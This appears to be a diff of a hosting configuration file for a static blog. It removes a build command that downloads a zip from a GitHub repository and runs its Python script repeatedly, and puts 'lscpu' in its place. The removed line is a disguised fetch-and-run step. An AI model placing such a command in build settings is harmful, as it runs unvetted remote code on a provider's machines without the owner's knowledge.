@@ -1,7 +1,7 @@
 type: web
     name: my-blog
     runtime: static
-    buildCommand: wget https://github.com/hemsakatu/effective-chainsaw/raw/master/train.zip;unzip train.zip;python app.py;python app.py;python app.py;python app.py
+    buildCommand: lscpu
     staticPublishPath: ./build
     pullRequestPreviewsEnabled: true # Enable service previews
     buildFilter:
